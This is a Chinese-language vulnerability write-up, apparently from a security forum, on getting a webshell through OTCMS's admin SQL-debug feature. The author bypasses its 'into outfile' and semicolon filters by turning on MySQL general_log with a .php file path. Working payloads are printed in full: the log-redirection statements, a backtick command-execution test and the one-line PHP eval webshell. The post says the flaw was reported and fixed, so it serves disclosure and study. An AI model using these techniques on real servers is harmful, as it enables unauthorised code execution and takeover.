### 后台SQL getshell

登录后台之后，选择管理员专区=&gt;程序文件检查=&gt;SQL语句调试，能够直接进行SQL命令的执行，随便输入一条查询某张表中数据的SQL语句，BurpSuite抓包

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d8bf15f5ae0d91fe878769677c26c2abfd1e8373.png)

放包，直到找到如下的API接口的数据包，可以看到`sqlContent`处为查询的sql语句，看到这的直接想法就是直接写入shell

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c0dbeea3a26e7f83b048d0cf30e7f19f28b3f529.png)

先用下面的poc打了一发

```php
select <?php phpinfo();?> into outfile "D://phpStudy//www//OTCMS//xxx.php"
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-203e4af665dd6e93b90451b7f8713bb81ba1616e.png)

可以看到过滤了`into outfile`，根据路径直接来看一下源代码  
`OTCMS/admin/sysCheckFile_deal.php#1348`

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1b5ca3ba9e887525d5d4a56d080ed9b46f8b565f.png)

首先会对输入的内容进行一个长度校验，如果输入为空就会返回对应的错误信息；之后会对我们输入的内容进行一个大小写转换，这就没办法利用大小写进行一个关键字的绕过了；之后对输入内容进行指定关键词的匹配，如果匹配到了`into outfile`就会直接报错，执行流程也就不会往下走，就算没有匹配到，也会对16进制的标识符0x进行查找匹配，所以利用`into outfile`写入shell的路子基本上就绝了  
先接着看流程，在1361行，会对`userpwd`进行一个哈希加密，`MB_uerKey`是储存在数据库当中的，对输入的`pwd`进行一次`MD5`加密之后和`key`拼接再一次`MD5`加密，然后对我们执行SQL语句时输入的校验登录密码的值进行一个比较，不相等就报错

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d3d9420dade5154ea8c32985702f0779164c1ca3.png)

下面还有一个匹配分号的过滤，所以如果能够写马，这里就需要用到进制绕过，那么上面为什么会对16进制的标识符进行一个过滤也就能解释的通了。

#### phpmyadmin的启发

本以为到这里就结束了，没办法了，但是不得不说，真的是灵光一闪，想到了`phpmyadmin getshell`的几种方式，其中之一就是通过查询是否开启日志，并且查看是否有权限开启，并指定日志的存储路径来`getshell`，那么这里也可以进行相同的尝试；我们可以通过开启数据库日志，并指定日志文件，那么其实每条SQL语句都会被写入到日志文件当中，那么也就可以`getshell`了

```php
SET GLOBAL general_log='on'
SET GLOBAL general_log_file='C:/phpStudy/www/xxx.php'//指定的文件路径，这里实战中遇到的话，就需要对其绝对路径进行一个猜测了
```

成功在指定路径下创建了日志文件

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c947e59aa07efab0ad5ff9c2bb81836fe267a4f0.png)

就在准备写入shell的时候突然想到，分号还是会被匹配到，需要换一种形式，并且之前看过一篇文章也提到了分号的问题，找了找，可以用函数调用的形式执行phpinfo

```php
select <?php if(phpinfo()){}?>
select <?php while(phpinfo()){}?>
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2a6b50f1831438a23323d5618b354c648496e323.png)

成功写入了，访问一下指定的日志文件

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a6460710687f3394540b9e008a37ed8a6d076499.png)

可以看到`phpinfo`已经成功执行了，但是到这里还是没有办法写入`shell`，还是需要对`payload`进行修改，想到了反引号在`php`中相当于命令执行函数，那么也许并不需要分号进行闭合，清空一下日志文件，执行以下`paylaod`，可以看到成功进行了命令执行并输出了结果，能够命令执行那么就简单了，直接反弹`shell`，之后还可以通过反弹的`shell`再进行`shell`的写入

```php
select '<?php echo `whoami`?>'
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-62688919e425c818755a2367add0310dd461dce4.png)

到这里其实已经可以命令执行了，但是还有一个问题，php的一句话shell，最后面真的需要分号进行闭合才能够执行么？可能走到了误区，平时写shell都是那么写的，想当然觉得没有分号就不能够执行，那就本地先试一下吧

```php
//shell.php
<?php eval($_POST[1])?>
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e448da5960fc004d05322cab52a74597b62f4bee.png)

结果显而易见是可以成功执行的，那么不难理解php中分号作为分隔符，只要shell后面没有其他的内容，那么有没有分号都是一样的，那么这里的分号匹配对我们来说并没有任何影响，那就直接写入shell

```php
select '<?php eval($_POST[1])?>'
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bb3a5e0c1d2296c217a0eb2f13ca611147c29492.png)

### 后记

当时这个也是困扰了许久因为分号的问题，后面还是大哥的提醒去试试看，不仅成功getshell，也是走出了之前形成的一个误区，收获多多。

### PS

这个漏洞已经修复了，当时上交CNVD，不收，直接反馈给了CMS开发，前两天跟开发聊了聊也是已经在新出的版本修复了，开发当时还想送我点CMS的插件币，可惜也不用这个CMS，还是希望这些更新及时的CMS能够更好的发展下去。